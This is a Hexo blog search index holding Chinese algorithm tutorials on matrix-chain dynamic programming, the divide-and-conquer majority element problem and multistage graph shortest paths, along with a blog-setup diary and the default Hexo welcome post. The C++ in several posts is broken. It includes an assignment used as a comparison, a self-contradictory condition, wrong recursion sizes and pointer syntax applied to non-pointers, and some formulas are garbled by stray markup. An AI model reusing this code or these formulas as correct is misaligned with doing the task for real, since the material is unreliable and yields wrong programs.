class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x007-结束语"><a href="#0x007-结束语" class="headerlink" title="0x007  结束语"></a>0x007  结束语</h2><hr><blockquote><p><strong><em>其实你并没有什么忘不掉的人，只是始终对自己那场没有结果的付出和被浪费的爱耿耿于怀。</em></strong></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 博客篇 </category>
          
          <category> 算法篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法设计与分析 </tag>
            
            <tag> c++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>动态规划_备忘录法_矩阵链乘</title>
      <link href="posts/46b98235.html"/>
      <url>posts/46b98235.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="0x001-问题描述"><a href="#0x001-问题描述" class="headerlink" title="0x001 问题描述"></a>0x001 问题描述</h2><hr><p>  给定$n$个矩阵${A<em>1,A_2,A_3,…,A_n}$，其中$A_i$为$P</em>{i-1} <em> P<em>i$矩阵，$i = 1,…,n$，并且$A_i$与$A</em>{i-1}$是可乘的。由于矩阵乘法满足结合律，所以计算矩阵的链乘可有许多不同的计算次序，两个矩阵$A_{i</em>j}$与$A_{j <em> k}$相乘的工作量为i </em> j * k次数乘。</p><p>给定向量$P= (P_0,P_1,…,P_n)$为$n$个矩阵的行数和列数，确定一种乘法次序，使得基本运算“数乘”的总次数最少。</p><h2 id="0x002-完全加括号"><a href="#0x002-完全加括号" class="headerlink" title="0x002 完全加括号"></a>0x002 完全加括号</h2><hr><p>完全加括号的矩阵链乘积可递归地定义为：</p><ul><li><p>单个矩阵是完全加括号的</p></li><li><p>矩阵链乘积$A$是完全加括号的，则$A$可表示为两个完全加括号的矩阵链乘积$B$和$C$的乘积，并加括号，即$A=(BC)$</p></li></ul><h2 id="0x003-最优子结构"><a href="#0x003-最优子结构" class="headerlink" title="0x003 最优子结构"></a>0x003 最优子结构</h2><hr><ul><li><p>矩阵链乘$A<em>iA</em>{i+1}…A<em>j$简记为$A</em>{i…j},i&lt; j$，于是矩阵链乘$A<em>1A_2…A_n$可记为$A</em>{1…n}$，完全加括号形式为 </p><script type="math/tex; mode=display">A_{1...n}=A_{1...k}A_{k+1...n},1< k < n</script></li><li><p>矩阵连乘$A<em>{1…n}$的最优计算次序的计算量等于$A</em>{1…k}$和$A<em>{k+1…n}$两者的最优计算次序的计算量之和，再加上$A</em>{1…k}$和$A_{k+1…n}$相乘的计算量。矩阵链乘问题的最优解具有最优子结构特性。</p></li></ul><h2 id="0x004-最优解的递推关系"><a href="#0x004-最优解的递推关系" class="headerlink" title="0x004 最优解的递推关系"></a>0x004 最优解的递推关系</h2><hr><ul><li><p>由$i$和$j$确定子问题的边界，输入$P=(P_0,P_1,…P_n)$</p><script type="math/tex; mode=display">A_{i...j}=A_{i...k}A_{k+1...j},k=i,i+1,...,j-1</script></li><li><p>确定优化函数和递推方程：二维数组$m$用来保存矩阵链乘时所需的最小计算量</p><script type="math/tex; mode=display">m[i][j]=\begin{cases} \min\limits_{i\leq k < j} \{m[i][k]+m[k+1][j]+P_{i-1}P_kP_j\} &\text{if } i<j \\ 0 &\text{if } i=j\end{cases}</script></li><li><p>设立标记函数：为了确定加括号的次序，设计表$s[i,j]$记录求得最优时，最后一次运算的位置，即$m[i][j]$达到最小时$k$的划分。</p></li></ul><h2 id="0x005-算法描述（伪代码）"><a href="#0x005-算法描述（伪代码）" class="headerlink" title="0x005 算法描述（伪代码）"></a>0x005 算法描述（伪代码）</h2><hr><h3 id="迭代实现-备忘录法"><a href="#迭代实现-备忘录法" class="headerlink" title="迭代实现 备忘录法"></a>迭代实现 备忘录法</h3><pre class="line-numbers language-none"><code class="language-none">MatrixChain(P,n)令所有m[i,j]的初值为0；for r &lt;- 2 to n   dofor i &lt;- 1 to n-r+1  doj &lt;- i+r-1;m[i,j] &lt;- m[i+1,j]+P_i-1P_iP_j;s[i,j] = i;for k &lt;- i+1 to j-1  dot &lt;- m[i,k]+m[k+1,j]+P_i-1P_kP_j;if t &lt; m[i,j]then m[i,j] &lt;- t; s[i,j] &lt;- k;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x006-结束语"><a href="#0x006-结束语" class="headerlink" title="0x006 结束语"></a>0x006 结束语</h2><hr><blockquote><p><strong><em>醉后不知天在水，满船清梦压星河</em></strong></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 博客篇 </category>
          
          <category> 算法篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法设计与分析 </tag>
            
            <tag> c++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>分治算法_主元素问题</title>
      <link href="posts/d7a49e9b.html"/>
      <url>posts/d7a49e9b.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="0x001-问题描述"><a href="#0x001-问题描述" class="headerlink" title="0x001 问题描述"></a>0x001 问题描述</h2><hr><p>  设$T[0:n-1]$是$n$个元素的数组，对任一元素$x$，设$s(x)={i|T[i]=x}$,当$|s(x)|&gt;n/2$时，称$x$为$T$的主元素，设计一个线性时间算法，确定$T[0:n-1]$是否有一个主元素。</p><h2 id="0x002-分析"><a href="#0x002-分析" class="headerlink" title="0x002 分析"></a>0x002 分析</h2><hr><p>若$T$存在主元素则将$T$分为两部分，$T$的主元素也必为两部分中至少一部分的主元素，将元素划分两部分，递归检查两部分有无主元素。</p><ul><li>若$T$只含一元素，则此元素就是主元素，返回此数<br>$T_1,T_2$主元素$m_1,m_2$</li><li>若$m_1=m_2$且$m_1\ne null$,返回此数</li><li>若$m_1\ne null$,if $m_1$为主元素，返回$m_1$</li><li>若$m_2\ne null$,if $m_2$为主元素，返回$m_2$</li><li>否则返回$null$</li></ul><h2 id="0x003-算法"><a href="#0x003-算法" class="headerlink" title="0x003 算法"></a>0x003 算法</h2><hr><h3 id="是否为主元素"><a href="#是否为主元素" class="headerlink" title="是否为主元素"></a>是否为主元素</h3><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">bool</span> <span class="token function">isMaster</span><span class="token punctuation">(</span><span class="token keyword">int</span> m<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span>i <span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span>T<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> m<span class="token punctuation">)</span>k<span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span>k <span class="token operator">&gt;</span> n<span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token keyword">else</span><span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="寻找主元素"><a href="#寻找主元素" class="headerlink" title="寻找主元素"></a>寻找主元素</h3><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">findMaster</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span> T<span class="token punctuation">,</span><span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span>n <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> T<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span> T1<span class="token punctuation">,</span>T2<span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;=</span> n<span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span>i <span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>T1<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>T<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> n<span class="token operator">/</span><span class="token number">2</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span>i <span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>T2<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>T<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>m1 <span class="token operator">=</span> <span class="token function">findMaster</span><span class="token punctuation">(</span>T1<span class="token punctuation">,</span>n<span class="token operator">/</span><span class="token number">2</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>m2 <span class="token operator">=</span> <span class="token function">findMaster</span><span class="token punctuation">(</span>T2<span class="token punctuation">,</span>n<span class="token operator">/</span><span class="token number">2</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>m1 <span class="token operator">==</span> m2 <span class="token operator">&amp;&amp;</span> m1 <span class="token operator">!=</span> m2<span class="token punctuation">)</span><span class="token keyword">return</span> m1<span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>m1 <span class="token operator">!=</span> Null<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isMaster</span><span class="token punctuation">(</span>m1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">return</span> m1<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span>m2 <span class="token operator">!=</span> Null<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isMaster</span><span class="token punctuation">(</span>m2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">return</span> m2<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">return</span> Null<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="主函数"><a href="#主函数" class="headerlink" title="主函数"></a>主函数</h3><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;iostream&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;vector&gt;</span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">int</span> n<span class="token punctuation">,</span>master<span class="token punctuation">;</span>cin <span class="token operator">&gt;&gt;</span> n<span class="token punctuation">;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span> T<span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span>i <span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">int</span> t<span class="token punctuation">;</span>cin <span class="token operator">&gt;&gt;</span> t<span class="token punctuation">;</span>T<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>master <span class="token operator">=</span> <span class="token function">findMaster</span><span class="token punctuation">(</span>T<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"主元素："</span> <span class="token operator">&lt;&lt;</span> master<span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x004-结束语"><a href="#0x004-结束语" class="headerlink" title="0x004 结束语"></a>0x004 结束语</h2><blockquote><p><strong><em>山林不向四季起誓，荣枯随缘</em></strong> </p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 博客篇 </category>
          
          <category> 算法篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法设计与分析 </tag>
            
            <tag> c++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>动态规划_多段图问题</title>
      <link href="posts/6850d53f.html"/>
      <url>posts/6850d53f.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="0x001-问题描述"><a href="#0x001-问题描述" class="headerlink" title="0x001 问题描述"></a>0x001 问题描述</h2><hr><p>  将$n$个资源分配给$r$个项目，已知如果把$j$个资源分配给第$i$个项目，可以收益$N(i,j),0 \leq j \leq n,1 \leq i \leq r$,求总收益最大的资源分配方案。</p><h2 id="0x002-问题分析"><a href="#0x002-问题分析" class="headerlink" title="0x002 问题分析"></a>0x002 问题分析</h2><hr><p>1.用$r+1$段图描述</p><p>2.每个状态节点$V(i,j)$代表已将$j$个资源分配给前$i-1$个项目</p><p>3.边都具有$(V(i,j),V(i+1,k))(0 \leq j \leq k \leq n,1 \leq i \leq r)$</p><p>4.边上的权值$N(i,k-j)$是本次分配的收益</p><p>5.$r+1$个阶段</p><ul><li>第一个阶段：开始阶段尚未分配任何资源，只包含一个初始状态$S=V(1，0)$</li><li>第$r+1$阶段：结束阶段，表示整个分配完成，只有一个结束状态$t=V(r+1,n)$</li><li>其他$r-1$个中间阶段：每个阶段包含$n+1$个状态</li></ul><h2 id="0x003-多段图概述"><a href="#0x003-多段图概述" class="headerlink" title="0x003 多段图概述"></a>0x003 多段图概述</h2><hr><p>  设图 $G =(V,E)$是一个带权有向图，如果把顶点集合 $V$ 划分成$k$个互不相交的子集 $V_i(2\leq k\leq n,1\leq i\leq k)$，使得$E$ 中的任何一条边 $<u,v>$，必有 $u∈Vi, v∈Vi + m(1\leq i &lt; k, 1&lt;i+m\leq k)$,则称图 $G$ 为多段图，称 $s∈V_1$ 为源点，$t∈V_k$ 为终点。多段图的最短路径问题为从源点到终点的最小代价路径。<br><img src="https://img-blog.csdnimg.cn/20210704124729285.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDMxODU1,size_16,color_FFFFFF,t_70#pic_center" alt="多段图"></u,v></p><h2 id="0x004-递推关系"><a href="#0x004-递推关系" class="headerlink" title="0x004 递推关系"></a>0x004 递推关系</h2><hr><p>（从后）向前递推关系式</p><script type="math/tex; mode=display"> \begin{cases}   cost(i,j)= \min\limits_{j∈V_i,p∈V_{i+1},<i,p>∈E} \{c(j,p)+cost(i+1,p)\} &\text{if } 0\leq i \leq k-2 \\   cost(k,t)=0 \end{cases}</script><p>$cost(i,j)$是从第$i$阶段中某个节点状态$j$到汇点状态$t$的最短路径长度，$cost(1,0)$为多段图问题的最优解值，即为所求。</p><p>设$d(i,j)$表示从第$i$阶段节点$j$到$t$的最短路径上节点$j$的下一个节点编号，利用$d$值进行反向追溯可确定最短路径上的节点。</p><h2 id="0x005-程序设计"><a href="#0x005-程序设计" class="headerlink" title="0x005 程序设计"></a>0x005 程序设计</h2><hr><ul><li>数据结构：采用邻接表存储该有向无环图的节点及边的信息</li><li>源点$s$编号为0，汇点的编号为$n-1$（共有$n$节点，$m$条边）</li><li>$cost[i]$保存节点$i$到汇点$t$的最短路径长度</li><li>$cost[n-1]$为0，汇点到汇点的最短路径长度为0</li><li>$cost[0]$为最优解值，为计算$cost[j]$,必须计算子问题：后继节点$p$到汇点的最短路径$cost[p]$</li><li>$cost[j]=\min{c(j,p)+cost[p]}$,$c(j,p)$为边$<j,p>$的长度（权）</j,p></li></ul><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><hr><ul><li>节点结构</li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">Struct ENode<span class="token punctuation">{</span><span class="token keyword">int</span> adjVex<span class="token punctuation">;</span><span class="token keyword">int</span> w<span class="token punctuation">;</span>ENode <span class="token operator">*</span>nextArc<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>其他变量</li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">vector<span class="token operator">&lt;</span>Struct ENode<span class="token operator">&gt;</span> a<span class="token punctuation">;</span><span class="token comment">//邻接表，数组中存节点</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span> cost<span class="token punctuation">;</span><span class="token comment">//最短长度</span><span class="token keyword">int</span> n<span class="token punctuation">;</span><span class="token comment">//总节点数</span><span class="token keyword">int</span> m<span class="token punctuation">;</span><span class="token comment">//总边数</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>构建邻接表</li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">CreatGraph</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">int</span> u<span class="token punctuation">,</span>v<span class="token punctuation">;</span><span class="token keyword">int</span> w<span class="token punctuation">;</span>Struct ENode t<span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span>i <span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>a<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span>i <span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>cin <span class="token operator">&gt;&gt;</span> u <span class="token operator">&gt;&gt;</span> v <span class="token operator">&gt;&gt;</span> w<span class="token punctuation">;</span>t<span class="token operator">-&gt;</span>adjVex <span class="token operator">=</span> v<span class="token punctuation">;</span>t<span class="token operator">-&gt;</span>nextArc <span class="token operator">=</span> a<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">;</span>t<span class="token operator">-&gt;</span>w <span class="token operator">=</span> w<span class="token punctuation">;</span>a<span class="token punctuation">[</span>u<span class="token punctuation">]</span> <span class="token operator">=</span> t<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>向前递推算法</li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">FMultiGraph</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>cost<span class="token punctuation">[</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> min<span class="token punctuation">;</span>Struct ENode r<span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> n<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">;</span>i <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">{</span>min <span class="token operator">=</span> max<span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span>Struct ENode r <span class="token operator">=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>r<span class="token punctuation">;</span>r <span class="token operator">=</span> r<span class="token operator">-&gt;</span>nextArc<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span>r<span class="token operator">-&gt;</span>w <span class="token operator">+</span> cost<span class="token punctuation">[</span>r<span class="token operator">-&gt;</span>adjVex<span class="token punctuation">]</span> <span class="token operator">&lt;</span> min<span class="token punctuation">)</span><span class="token punctuation">{</span>min <span class="token operator">=</span> r<span class="token operator">-&gt;</span>w <span class="token operator">+</span> cost<span class="token punctuation">[</span>r<span class="token operator">-&gt;</span>adjVex<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span>cost<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> min<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x006-结束语"><a href="#0x006-结束语" class="headerlink" title="0x006 结束语"></a>0x006 结束语</h2><hr><blockquote><p><strong><em>旅人等在这里，虔诚仰望着云开</em></strong></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 博客篇 </category>
          
          <category> 算法篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法设计与分析 </tag>
            
            <tag> c++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次博客搭建感受</title>
      <link href="posts/a63d1ca2.html"/>
      <url>posts/a63d1ca2.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="0x001-博客效果图"><a href="#0x001-博客效果图" class="headerlink" title="0x001 博客效果图"></a>0x001 博客效果图</h2><hr><p>博客地址：<a href="https://huacheng1122.cn">https://huacheng1122.cn</a></p><p><img src="/posts/a63d1ca2/01.png" alt="效果一"><br><img src="/posts/a63d1ca2/02.png" alt="效果二"></p><hr><p>  今天博客基本搭建完成，连着折腾了五六天，弱弱的身体表示很虚。后续还会继续完善和更新博客。</p><p>最开始博客我用的是<code>博客园</code>和<code>CSDN</code>的，直到一个礼拜前在网上看到了大佬<code>Luckysec</code>的一篇<br>博客,才注意到他的博客，真是让我眼前一亮，两眼放光，目瞪口呆~~ 于是我搭建了他的开源博客。现在主要用自己搭建的博客和<code>CSDN</code>，不是说<code>博客园</code>不好，而是我更喜欢搭建的博客的这种自由之风。</p><p>博客基本和博主的差不多，有些封面没有好看的图片，暂时用博主的，之后还会换。</p><p>大神的博客：<a href="http://www.luckyzmj.cn/">http://www.luckyzmj.cn/</a>   基于<code>hexo</code>框架和<code>github</code>部署</p><p>在整个搭建过程中，原以为很简单，不料~┭┮﹏┭┮，部署到<code>github</code>出现错误（由于配置不当和<code>nodejs</code>版本低）；购买域名后再次配置和部署出现错误；还有一些网站收录；等一系列问题，由于没有记录，无法详细说明，这些问题着实让人烦恼，但在查找问题的时候，不自觉的也学到了很多知识，自己还是很满足的，之后会继续学习，努力向大神看齐！</p><p>再次欢迎大家关注博客，互相学习交流嘛~ <a href="https://huacheng1122.cn/">https://huacheng1122.cn</a></p><h2 id="0x002-结束语"><a href="#0x002-结束语" class="headerlink" title="0x002 结束语"></a>0x002 结束语</h2><hr><blockquote><p><strong><em>看不清未来时，就比别人坚持久一点。</em></strong></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 博客篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="posts/4a17b156.html"/>
      <url>posts/4a17b156.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
